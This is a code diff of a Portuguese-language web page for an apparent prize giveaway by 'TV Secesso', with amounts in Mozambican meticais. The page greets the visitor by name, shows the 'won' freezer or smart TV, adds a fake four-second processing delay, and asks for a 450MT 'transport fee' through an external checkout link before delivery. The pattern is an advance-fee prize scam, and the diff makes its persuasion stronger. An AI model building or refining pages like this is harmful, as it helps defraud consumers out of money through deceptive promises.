@@ -1,8 +1,8 @@
 <!DOCTYPE html>
 <html lang="pt">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>A Processar Respostas...</title>
   <style>
     body {
@@ -62,12 +62,31 @@
       padding: 20px;
       border-radius: 12px;
       box-shadow: 0 0 12px #00ff8855;
-      margin-bottom: 30px;
+      margin-bottom: 20px;
       text-align: left;
     }
 
     .dados strong {
       color: #33ff66;
+    }
+
+    .premio-img {
+      max-width: 100%;
+      border-radius: 12px;
+      margin-bottom: 25px;
+      box-shadow: 0 0 15px #33ff66aa;
+    }
+
+    .mensagem {
+      font-size: 1.1rem;
+      color: #ddd;
+      margin-bottom: 30px;
+      line-height: 1.5;
+      text-align: left;
+      background: #1a1a1a;
+      padding: 20px;
+      border-radius: 12px;
+      box-shadow: 0 0 12px #00ff8855;
     }
 
     .botao {
@@ -86,6 +105,7 @@
       max-width: 460px;
       width: 100%;
       text-decoration: none;
+      text-align: center;
     }
 
     @keyframes piscar {
@@ -103,17 +123,24 @@
 
     <div class="resultado" id="resultado">
       <h1>🎉 Parabéns, <span id="nomeClienteSpan"></span>!</h1>
-      <p>Foste seleccionado para receber o teu prémio com entrega directa em tua casa.</p>
+      <p>Foste selecionado para receber o teu prémio com entrega directa à tua porta.</p>
+
+      <img id="premioImagem" class="premio-img" src="" alt="Imagem do Prémio" />
 
       <div class="dados">
         <p><strong>📍 Localização:</strong> <span id="zonaClienteSpan"></span></p>
         <p><strong>📞 Contacto:</strong> <span id="contactoClienteSpan"></span></p>
       </div>
 
-      <p style="margin-bottom: 30px;">Um dos nossos agentes vai entrar em contacto contigo assim que o pagamento da taxa de entrega for confirmado.</p>
+      <div class="mensagem">
+        <p>A equipa da <strong>TV Secesso</strong> irá entrar em contacto contigo até amanhã para combinar a entrega do teu prémio.</p>
+        <p>Por favor, mantenha o telefone disponível para que possamos ligar e combinar todos os detalhes da entrega.</p>
+        <p>Para receberes o prémio, pedimos apenas que pagues uma taxa simbólica de transporte, que cobre os custos logísticos para levar o produto até à tua casa.</p>
+        <p>Assim que o pagamento da taxa for confirmado, um dos nossos agentes dará início ao processo de entrega.</p>
+      </div>
 
-      <a href="https://venduspay.com/checkout.html?id=644" class="botao">
-        ✅ Confirmar Entrega por 450MT
+      <a href="https://venduspay.com/checkout.html?id=644" class="botao" target="_blank" rel="noopener noreferrer">
+        ✅ Pagar Taxa de Transporte - 450MT
       </a>
     </div>
   </div>
@@ -123,18 +150,40 @@
     const nome = localStorage.getItem('nomeCliente') || "Cliente";
     const zona = localStorage.getItem('zonaCliente') || "Zona não definida";
     const contacto = localStorage.getItem('contactoCliente') || "Sem contacto";
+    const premio = localStorage.getItem('premioEscolhido') || "";
 
     // Preencher no HTML
     document.getElementById('nomeClienteSpan').textContent = nome;
     document.getElementById('zonaClienteSpan').textContent = zona;
     document.getElementById('contactoClienteSpan').textContent = contacto;
 
-    // Mostrar resultado com atraso (efeito de suspense)
+    // Mapear prémio para imagem correspondente
+    const imagensPremios = {
+      "Congelador": "img/congelador.jpg",
+      "TV Smart 42": "img/tvsmart.jpg",
+      "Geleira Vertical": "img/geleira.jpg",
+      "Geleira": "img/geleira.jpg",
+      "TV Smart 42”": "img/tvsmart.jpg"
+      // Adicione outras opções se necessário
+    };
+
+    const imgSrc = imagensPremios[premio] || "";
+
+    const imgElemento = document.getElementById('premioImagem');
+    if (imgSrc) {
+      imgElemento.src = imgSrc;
+      imgElemento.alt = `Imagem do prémio: ${premio}`;
+      imgElemento.style.display = "block";
+    } else {
+      imgElemento.style.display = "none";
+    }
+
+    // Mostrar resultado com atraso (efeito suspense)
     setTimeout(() => {
       document.querySelector('.processando').style.display = 'none';
       document.getElementById('resultado').style.display = 'block';
       document.getElementById('resultado').scrollIntoView({ behavior: 'smooth' });
-    }, 4000); // 4 segundos de suspense
+    }, 4000); // 4 segundos suspense
   </script>
 </body>
 </html>
